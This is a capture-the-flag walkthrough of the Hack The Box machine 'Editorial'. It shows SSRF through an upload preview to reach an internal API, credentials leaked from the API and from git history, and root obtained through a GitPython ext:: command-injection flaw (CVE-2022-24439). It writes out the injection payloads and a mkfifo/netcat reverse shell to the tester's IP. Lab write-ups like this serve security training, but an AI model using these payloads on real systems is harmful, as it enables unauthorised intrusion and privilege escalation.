 #HacktheBox 


First Nmap to open port:

```bash
nmap -sT -Pn -p- --min-rate 10000 10.10.11.20
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-16 03:32 EDT
Nmap scan report for editorial.htb (10.10.11.20)
Host is up (0.31s latency).
Not shown: 65450 filtered tcp ports (no-response), 83 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 40.45 seconds
```

Here i try dir , subdomain enum but not able to find things:

Now i see there is a upload func in the website so i test for uploading rev shell but it also failed:

Here i intercept the "preview" in the upload func:

![](images/Pasted%20image%2020240616130755.png)

I intercept the preview req and here i transfer the req in repeater :

![](images/Pasted%20image%2020240616130901.png)

Here i get a endpoint so i try to curl it check response:

```bash
curl http://editorial.htb/static/uploads/f8e00512-da77-4d04-9362-d06030e99963 
<!doctype html>
<html lang=en>
<title>404 Not Found</title>
<h1>Not Found</h1>
<p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
```

But I doing 1 thing wrong Here this is a SSRF but so intead the vpn ip i should give me local-host ip:

Here there is a mess we have to specify a port i try many port like 80,8000,8080,8888 etc but they did not give me any response on curl finally i worked for port 5000:

![](images/Pasted%20image%2020240616131626.png)

```bash
curl http://editorial.htb/static/uploads/f4974b20-a067-4c24-91ec-295508076a47
{"messages":[{"promotions":{"description":"Retrieve a list of all the promotions in our library.","endpoint":"/api/latest/metadata/messages/promos","methods":"GET"}},{"coupons":{"description":"Retrieve the list of coupons to use in our library.","endpoint":"/api/latest/metadata/messages/coupons","methods":"GET"}},{"new_authors":{"description":"Retrieve the welcome message sended to our new authors.","endpoint":"/api/latest/metadata/messages/authors","methods":"GET"}},{"platform_use":{"description":"Retrieve examples of how to use the platform.","endpoint":"/api/latest/metadata/messages/how_to_use_platform","methods":"GET"}}],"version":[{"changelog":{"description":"Retrieve a list of all the versions and updates of the api.","endpoint":"/api/latest/metadata/changelog","methods":"GET"}},{"latest":{"description":"Retrieve the last version of api.","endpoint":"/api/latest/metadata","methods":"GET"}}]}

```

Here we get diff api endpoint so i try every api to see response:

```bash
/api/latest/metadata/messages/promos

/api/latest/metadata/messages/coupons

/api/latest/metadata/messages/authors

/api/latest/metadata/messages/how_to_use_platform

/api/latest/metadata/changelog

```

Here promos didnot get any result.

coupons get some :

```bash
curl -X GET http://editorial.htb/static/uploads/a4c79d80-4deb-4618-9524-b64ec94fd423
[{"2anniversaryTWOandFOURread4":{"contact_email_2":"info@tiempoarriba.oc","valid_until":"12/02/2024"}},{"frEsh11bookS230":{"contact_email_2":"info@tiempoarriba.oc","valid_until":"31/11/2023"}}]
```

Here authors give good response:

![](images/Pasted%20image%2020240616132058.png)

```bash
curl -X GET http://editorial.htb/static/uploads/a8504179-e649-404c-a36f-b560700dcbdb
{"template_mail_message":"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: dev\nPassword: dev080217_devAPI!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, Editorial Tiempo Arriba Team."}

```

WOOPS ! We get user dev and his password

dev:dev080217_devAPI!@

Now i login through dev and pass and get user.txt flag:

```bash
ssh dev@10.10.11.20       
The authenticity of host '10.10.11.20 (10.10.11.20)' can't be established.
ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.20' (ED25519) to the list of known hosts.
dev@10.10.11.20's password: 
Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Sun Jun 16 04:43:38 AM UTC 2024

  System load:           0.12
  Usage of /:            66.1% of 6.35GB
  Memory usage:          14%
  Swap usage:            0%
  Processes:             225
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.20
  IPv6 address for eth0: dead:beef::250:56ff:feb9:8c31


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


Last login: Mon Jun 10 09:11:03 2024 from 10.10.14.52
dev@editorial:~$ id
uid=1001(dev) gid=1001(dev) groups=1001(dev)

```

Now i run linpeas in it and i find a git folder:

```bash
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 /home/dev/apps/.git

```

```bash
dev@editorial:~/apps$ ls -la
total 12
drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
drwxr-x--- 5 dev dev 4096 Jun 16 04:50 ..
drwxr-xr-x 8 dev dev 4096 Jun  5 14:36 .git

```

Here i enumerate git folder and in log i found some interesting related to  user prod:

```bash
dev@editorial:~/apps/.git/logs$ cat HEAD
0000000000000000000000000000000000000000 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905723 -0500       commit (initial): feat: create editorial app
3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8 1e84a036b2f33c59e2390730699a488c65643d28 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682905870 -0500       commit: feat: create api to editorial info
1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906108 -0500       commit: change(api): downgrading prod to dev
b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dfef9f20e57d730b7d71967582035925d57ad883 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906471 -0500       commit: change: remove debug and update api port
dfef9f20e57d730b7d71967582035925d57ad883 8ad0f3187e2bda88bba85074635ea942974587e8 dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906661 -0500       commit: fix: bugfix in api port endpoint

```

1e84a036b2f33c59e2390730699a488c65643d28 b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb> 1682906108 -0500       commit: change(api): downgrading prod to dev

here i use gpt to know about this It is a Git commit entry, typically found in a Git log. It represents the details of a specific commit made to a Git repository.

So that's a commit history for your app repo. 

```bash
**Commit Hash**: `1e84a036b2f33c59e2390730699a488c65643d28`

- This hash uniquely identifies the commit. It's generated based on the contents of the commit, ensuring that any change to the commit's content will result in a different hash.
```

Here this hash comes in handy as it related to user prod:

so i use git show command to display detailed information about a specific Git object, usually a commit.

```bash
git show 1e84a036b2f33c59e2390730699a488c65643d28
commit 1e84a036b2f33c59e2390730699a488c65643d28
Author: dev-carlos.valderrama <dev-carlos.valderrama@tiempoarriba.htb>
Date:   Sun Apr 30 20:51:10 2023 -0500

    feat: create api to editorial info
    
    * It (will) contains internal info about the editorial, this enable
       faster access to information.

diff --git a/app_api/app.py b/app_api/app.py
new file mode 100644
index 0000000..61b786f
--- /dev/null
+++ b/app_api/app.py
@@ -0,0 +1,74 @@
+# API (in development).
+# * To retrieve info about editorial
+
+import json
+from flask import Flask, jsonify
+
+# -------------------------------
+# App configuration
+# -------------------------------
+app = Flask(__name__)
+
+# -------------------------------
+# Global Variables
+# -------------------------------
+api_route = "/api/latest/metadata"
+api_editorial_name = "Editorial Tiempo Arriba"
+api_editorial_email = "info@tiempoarriba.htb"
+
+# -------------------------------
+# API routes
+# -------------------------------
+# -- : home
+@app.route('/api', methods=['GET'])
+def index():
+    data_editorial = {
+        'version': [{
+            '1': {
+                'editorial': 'Editorial El Tiempo Por Arriba', 
+                'contact_email_1': 'soporte@tiempoarriba.oc',
+                'contact_email_2': 'info@tiempoarriba.oc',
+                'api_route': '/api/v1/metadata/'
+            }},
+            {
+            '1.1': {
+                'editorial': 'Ed Tiempo Arriba', 
+                'contact_email_1': 'soporte@tiempoarriba.oc',
+                'contact_email_2': 'info@tiempoarriba.oc',
+                'api_route': '/api/v1.1/metadata/'
+            }},
+            {
+            '1.2': {
+                'editorial': api_editorial_name, 
+                'contact_email_1': 'soporte@tiempoarriba.oc',
+                'contact_email_2': 'info@tiempoarriba.oc',
+                'api_route': f'/api/v1.2/metadata/'
+            }},
+            {
+            '2': {
+                'editorial': api_editorial_name, 
+                'contact_email': 'info@tiempoarriba.moc.oc',
+                'api_route': f'/api/v2/metadata/'
+            }},
+            {
+            '2.3': {
+                'editorial': api_editorial_name, 
+                'contact_email': api_editorial_email,
+                'api_route': f'{api_route}/'
+            }
+        }]
+    }
+    return jsonify(data_editorial)
+
+# -- : (development) mail message to new authors
+@app.route(api_route + '/authors/message', methods=['GET'])
+def api_mail_new_authors():
+    return jsonify({
+        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+    }) # TODO: replace dev credentials when checks pass
+
+# -------------------------------
+# Start program
+# -------------------------------
+if __name__ == '__main__':
+    app.run(host='127.0.0.1', port=5001, debug=True)
```

here it gives a detailed info and at the end we even get prod pass:

prod:080217_Producti0n_2023!@

Then i login prod with ssh:

here first i check sudo -l command and i get some interesting things:

```bash
prod@editorial:~$ sudo -l
[sudo] password for prod: 
Matching Defaults entries for prod on editorial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User prod may run the following commands on editorial:
    (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *

```

Here we see that prod can run the above command :

Here it takes a lot time i am writing things directly:

Reference:[Remote Code Execution (RCE) in gitpython | CVE-2022-24439 | Snyk](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)

```bash
prod@editorial:/tmp$ sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c "touch% /tmp/pwned"'
Traceback (most recent call last):
  File "/opt/internal_apps/clone_changes/clone_prod_change.py", line 12, in <module>
    r.clone_from(url_to_clone, 'new_changes', multi_options=["-c protocol.ext.allow=always"])
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1275, in clone_from
    return cls._clone(git, url, to_path, GitCmdObjectDB, progress, multi_options, **kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/repo/base.py", line 1194, in _clone
    finalize_process(proc, stderr=stderr)
  File "/usr/local/lib/python3.10/dist-packages/git/util.py", line 419, in finalize_process
    proc.wait(**kwargs)
  File "/usr/local/lib/python3.10/dist-packages/git/cmd.py", line 559, in wait
    raise GitCommandError(remove_password_if_present(self.args), status, errstr)
git.exc.GitCommandError: Cmd('git') failed due to: exit code(128)
  cmdline: git clone -v -c protocol.ext.allow=always ext::sh -c "touch% /tmp/pwned" new_changes
  stderr: 'Cloning into 'new_changes'...
/usr/bin/sh: 1: touch /tmp/pwned: not found
fatal: Could not read from remote repository.

Please make sure you have the correct access rights
and the repository exists.

```

here it showing error but command worked:

We can see pwned in tmp with root priv:

```bash
prod@editorial:/tmp$ ls -la pwned
-rw-r--r-- 1 root root 0 Jun 16 05:45 pwned

```

So seems like command works so i try for reverse - shell:


```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c rm% /tmp/f;% mkfifo% /tmp/f% &&% /bin/bash% -i% <% /tmp/f% 2>&1% |% nc% 10.10.16.4% 4000% >% /tmp/f'
```

Here this command takes a way long time because here space has to replaced by %

I get shell:

```bash
nc -lvp 4000  
listening on [any] 4000 ...
connect to [10.10.16.4] from editorial.htb [10.10.11.20] 40874
root@editorial:/opt/internal_apps/clone_changes# id
id
uid=0(root) gid=0(root) groups=0(root)

```
